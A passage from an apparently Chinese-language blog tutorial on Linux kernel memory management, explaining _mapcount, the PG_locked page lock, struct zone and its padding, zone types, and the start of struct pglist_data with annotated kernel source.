<li>若 <code>_mapcount</code> 等于 -1 ，表示没有 PTE 映射到页面。</li>
<li>若 <code>_mapcount</code> 等于 0 ，表示只有父进程映射到页面。<br> 匿名页面刚分配时， <code>_mapcount</code> 初始化为 0 。例如,当 <code>do_anonymous_page()</code> 产生的匿名页面通过 <code>page_add_new_anon_rmap()</code> 添加到 rmap 系统中时，会设置 <code>_mapcount</code> 为 0 ，这表明匿名页面当前只有父进程的 PTE 映射到页面。</li>
<li>若 <code>_mapcount</code> 大于 0 ,表示除了父进程外还有其他进程映射到这个页面。同样以创建子进程时共享父进程地址空间为例，设置父进程的 PTE 内容到子进程中并增加该页面的 <code>_mapcount</code> 。</li>
</ul>
<p>linux 内核通过 <code>page_dup_rmap</code> 函数修改 <code>_mapcount</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">page_dup_rmap</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">bool</span> compound)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">atomic_inc</span>(compound ? compound_mapcount_ptr(page) : &amp;page-&gt;_mapcount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="PG-Locked"><a href="#PG-Locked" class="headerlink" title="PG_Locked"></a>PG_Locked</h5><p><code>page</code> 数据结构中的成员 <code>flags</code> 定义了一个标志位 <code>PG_locked</code> ,内核通常利用 <code>PG_locked</code> 来设置一个页锁。<code>lock _page()</code> 函数用于申请页锁，如果页锁被其他进程占用了，那么它会睡眠等待。<br> <code>lock _page()</code> 函数的声明和实现如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">lock_page</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	might_sleep();</span><br><span class="line">	<span class="keyword">if</span> (!trylock_page(page))</span><br><span class="line">		__lock_page(page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">trylock_page</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	page = compound_head(page);</span><br><span class="line">    <span class="comment">/* 使用 test_and_set_bit_lock() 尝试为 page 的 flags 设置 PG_locked 标志位，并且返回原来标志位的值 */</span></span><br><span class="line">	<span class="keyword">return</span> (likely(!test_and_set_bit_lock(PG_locked, &amp;page-&gt;flags)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __lock_page(<span class="keyword">struct</span> page *__page)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> compound_head(__page);</span><br><span class="line">	<span class="type">wait_queue_head_t</span> *q = page_waitqueue(page);</span><br><span class="line">    <span class="comment">/* 当 trylock_page() 无法获取锁时,当前进程会调用wait_on_page_bit_common()函数让其在等待队列中睡眠、等待这个锁。*/</span></span><br><span class="line">	wait_on_page_bit_common(q, page, PG_locked, TASK_UNINTERRUPTIBLE,</span><br><span class="line">				EXCLUSIVE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="zone"><a href="#zone" class="headerlink" title="zone"></a>zone</h4><p>在 Linux 下将一个节点内不同用途的内存区域划分为不同的区（zone），对应结构体 <code>struct zone</code>，该结构体定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* zone watermarks, access with *_wmark_pages(zone) macros */</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    *  每个 zone 在系统启动时会计算出 3 个水位，</span></span><br><span class="line"><span class="comment">    *  分别是最低警戒水位（WMARK_MIN）、低水位（WMARK_LOW）和高水位（WMARK_HIGH），</span></span><br><span class="line"><span class="comment">    *  这在页面分配器和kswapd 页面回收中会用到。 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> _watermark[NR_WMARK];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> watermark_boost;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We don&#x27;t know if the memory that we&#x27;re going to allocate will be</span></span><br><span class="line"><span class="comment">	 * freeable or/and it will be released eventually, so to avoid totally</span></span><br><span class="line"><span class="comment">	 * wasting several GB of ram we must reserve some of the lower zone</span></span><br><span class="line"><span class="comment">	 * memory (otherwise we risk to run OOM on the lower zones despite</span></span><br><span class="line"><span class="comment">	 * there being tons of freeable ram on the higher zones).  This array is</span></span><br><span class="line"><span class="comment">	 * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl</span></span><br><span class="line"><span class="comment">	 * changes.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">/* 防止页面分配器过度使用低端 zone 的内存。 */</span></span><br><span class="line">	<span class="type">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="comment">/* NUMA 中标识所属 node */</span></span><br><span class="line">	<span class="type">int</span> node;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* 指向内存节点。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>	*<span class="title">zone_pgdat</span>;</span></span><br><span class="line">    <span class="comment">/* 用于维护每个CPU上的一系列页面，以减少自旋锁的争用。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Flags for a pageblock_nr_pages block. See pageblock-flags.h.</span></span><br><span class="line"><span class="comment">	 * In SPARSEMEM, this map is stored in struct mem_section</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		*pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span></span><br><span class="line">    <span class="comment">/* 起始页帧号。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		zone_start_pfn;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * spanned_pages is the total pages spanned by the zone, including</span></span><br><span class="line"><span class="comment">	 * holes, which is calculated as:</span></span><br><span class="line"><span class="comment">	 * 	spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * present_pages is physical pages existing within the zone, which</span></span><br><span class="line"><span class="comment">	 * is calculated as:</span></span><br><span class="line"><span class="comment">	 *	present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * managed_pages is present pages managed by the buddy system, which</span></span><br><span class="line"><span class="comment">	 * is calculated as (reserved_pages includes pages allocated by the</span></span><br><span class="line"><span class="comment">	 * bootmem allocator):</span></span><br><span class="line"><span class="comment">	 *	managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * So present_pages may be used by memory hotplug or memory power</span></span><br><span class="line"><span class="comment">	 * management logic to figure out unmanaged pages by checking</span></span><br><span class="line"><span class="comment">	 * (present_pages - managed_pages). And managed_pages should be used</span></span><br><span class="line"><span class="comment">	 * by page allocator and vm scanner to calculate all kinds of watermarks</span></span><br><span class="line"><span class="comment">	 * and thresholds.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Locking rules:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * zone_start_pfn and spanned_pages are protected by span_seqlock.</span></span><br><span class="line"><span class="comment">	 * It is a seqlock because it has to be read outside of zone-&gt;lock,</span></span><br><span class="line"><span class="comment">	 * and it is done in the main allocator path.  But, it is written</span></span><br><span class="line"><span class="comment">	 * quite infrequently.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The span_seq lock is declared along with zone-&gt;lock because it is</span></span><br><span class="line"><span class="comment">	 * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to</span></span><br><span class="line"><span class="comment">	 * give them a chance of being in the same cacheline.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Write access to present_pages at runtime should be protected by</span></span><br><span class="line"><span class="comment">	 * mem_hotplug_begin/end(). Any reader who can&#x27;t tolerant drift of</span></span><br><span class="line"><span class="comment">	 * present_pages should get_online_mems() to get a stable value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">/* zone 中被伙伴系统管理的页面数量。 */</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		managed_pages;</span><br><span class="line">    <span class="comment">/* zone 包含的页面数量。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		spanned_pages;</span><br><span class="line">    <span class="comment">/* zone 里实际管理的页面数量。对于一些架构来说，其值和 spanned _pages 的值相等。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		present_pages;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>		*name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Number of isolated pageblock. It is used to solve incorrect</span></span><br><span class="line"><span class="comment">	 * freepage counting problem due to racy retrieving migratetype</span></span><br><span class="line"><span class="comment">	 * of pageblock. Protected by zone-&gt;lock.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">	<span class="comment">/* see spanned/present_pages for more description */</span></span><br><span class="line">	<span class="type">seqlock_t</span>		span_seqlock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> initialized;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Write-intensive fields used from the page allocator */</span></span><br><span class="line">	ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* free areas of different sizes */</span></span><br><span class="line">    <span class="comment">/* 伙伴系统的核心数据结构，管理空闲页块(page block）链表的数组。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>	<span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* zone flags, see below */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Primarily protects free_area */</span></span><br><span class="line">    <span class="comment">/* 并行访问时用于保护 zone 的自旋锁。 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		lock;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Write-intensive fields used by compaction and vmstats. */</span></span><br><span class="line">	ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When free pages are below this point, additional steps are taken</span></span><br><span class="line"><span class="comment">	 * when reading the number of free pages to avoid per-cpu counter</span></span><br><span class="line"><span class="comment">	 * drift allowing watermarks to be breached</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">	<span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		compact_cached_free_pfn;</span><br><span class="line">	<span class="comment">/* pfn where async and sync compaction migration scanner should start */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		compact_cached_migrate_pfn[<span class="number">2</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment">	 * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment">	 * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		compact_considered;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		compact_defer_shift;</span><br><span class="line">	<span class="type">int</span>			compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">	<span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line">	<span class="type">bool</span>			compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">bool</span>			contiguous;</span><br><span class="line"></span><br><span class="line">	ZONE_PADDING(_pad3_)</span><br><span class="line">	<span class="comment">/* Zone statistics */</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line">	<span class="type">atomic_long_t</span>		vm_numa_stat[NR_VM_NUMA_STAT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br></pre></td></tr></table></figure></div>

<p><code>zone</code> 经常会被访问到，因此这个数据结构要求以 L1 高速缓存对齐。另外，这里的 <code>ZONE PADDING()</code> 让 <code>zone-&gt;lock</code> 和 <code>zone-&gt;lru_lock</code> 这两个很热门的锁可以分布在不同的高速缓存行中。一个内存节点最多有几个 <code>zone</code> ，因此 <code>zone</code> 数据结构不需要像 <code>page</code> 一样关注数据结构的大小，<code>ZONE_PADDING()</code> 可以为了性能而浪费空间。在内存管理开发过程中，内核开发者逐步发现有一些自旋锁会竞争得非常厉害，很难获取。在稍微早期的Linux内核（如Linux4.0）中，<code>zone-&gt;lock</code> 和 <code>zone-&gt;lru_lock</code> 这两个锁有时需要同时获取，因此保证它们使用不同的高速缓存行是内核常用的一种优化技巧。然而，在Linux 5.0内核中，<code>zone-&gt;lru_lock</code> 已经转移到内存节点的 <code>pglist_data</code> 数据结构中。</p>
<hr>
<p>通常情况下，内核的 <code>zone</code> 分为 <code>ZONE_DMA</code>、<code>ZONE_DMA32</code>、<code>ZONE NORMAL</code> 和 <code>ZONE_HIGHMEM</code> 。<code>zone</code> 类型定义在 <code>include/linux/mmzone.h</code> 文件中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * ZONE_DMA is used when there are devices that are not able</span></span><br><span class="line"><span class="comment">	 * to do DMA to all of addressable memory (ZONE_NORMAL). Then we</span></span><br><span class="line"><span class="comment">	 * carve out the portion of memory that is needed for these devices.</span></span><br><span class="line"><span class="comment">	 * The range is arch specific.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Some examples</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Architecture		Limit</span></span><br><span class="line"><span class="comment">	 * ---------------------------</span></span><br><span class="line"><span class="comment">	 * parisc, ia64, sparc	&lt;4G</span></span><br><span class="line"><span class="comment">	 * s390, powerpc	&lt;2G</span></span><br><span class="line"><span class="comment">	 * arm			Various</span></span><br><span class="line"><span class="comment">	 * alpha		Unlimited or 0-16MB.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * i386, x86_64 and multiple other arches</span></span><br><span class="line"><span class="comment">	 * 			&lt;16M.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ZONE_DMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DMA32</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * x86_64 needs two ZONE_DMAs because it supports devices that are</span></span><br><span class="line"><span class="comment">	 * only able to do DMA to the lower 16M but also 32 bit devices that</span></span><br><span class="line"><span class="comment">	 * can only do DMA areas below 4G.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ZONE_DMA32,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Normal addressable memory is in ZONE_NORMAL. DMA operations can be</span></span><br><span class="line"><span class="comment">	 * performed on pages in ZONE_NORMAL if the DMA devices support</span></span><br><span class="line"><span class="comment">	 * transfers to all addressable memory.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ZONE_NORMAL,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * A memory area that is only addressable by the kernel through</span></span><br><span class="line"><span class="comment">	 * mapping portions into its own address space. This is for example</span></span><br><span class="line"><span class="comment">	 * used by i386 to allow the kernel to address the memory beyond</span></span><br><span class="line"><span class="comment">	 * 900MB. The kernel will set up special mappings (page</span></span><br><span class="line"><span class="comment">	 * table entries on i386) for each page that the kernel needs to</span></span><br><span class="line"><span class="comment">	 * access.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ZONE_HIGHMEM,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	ZONE_MOVABLE,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DEVICE</span></span><br><span class="line">	ZONE_DEVICE,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	__MAX_NR_ZONES</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>ZONE_DMA</code>：用于 ISA 设备的 DMA 操作，范围是 0~16MB ，只适用于Intel x86 架构，ARM 架构没有这个内存管理区。</li>
<li><code>ZONE_DMA32</code>：用于最低 4GB 的内存访问的设备，如只支持 32 位的 DMA 设备。</li>
<li><code>ZONE_NORMAL</code>：4GB 以后的物理内存，用于线性映射物理内存。若系统内存小于 4GB，则没有这个内存管理区。</li>
<li><code>ZONE_HIGHMEM</code>：用于管理高端内存，这些高端内存是不能线性映射到内核地址空间的。注意，在 64 位Linux操作系统中没有这个内存管理区。</li>
</ul>
<h4 id="pglist-data"><a href="#pglist-data" class="headerlink" title="pglist_data"></a>pglist_data</h4><p><code>pglist_data</code> 数据结构用来描述一个内存节点的所有资源。在 UMA 架构中，只有一个内存节点，即系统有一个全局的变量 <code>contig_page_data</code> 来描述这个内存节点。在 NUMA 架构中，整个系统的内存由一个 <code>pglist_data *</code> 的指针数组 <code>node_data[]</code> 来管理，在系统初始化时通过枚举 BIOS 固件（ACPI）来完成。<code>pglist_data</code> 结构定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    * 字段包含该节点所拥有的 zones。 并非所有的 zone 都已被填充，但这是一个满的列表。</span></span><br><span class="line"><span class="comment">    * 它被该节点的 node_zonelists 以及其他节点的 node_zonelists 所引用.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line">    <span class="comment">/* 用于 buddy system 分配内存。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line">    <span class="comment">/* 内存区域数量。 */</span></span><br><span class="line">	<span class="type">int</span> nr_zones;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP	<span class="comment">/* means !SPARSEMEM */</span></span></span><br><span class="line">    <span class="comment">/* 页描述符，除了稀疏内存模型外都使用。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span></span><br><span class="line"><span class="meta">#<span 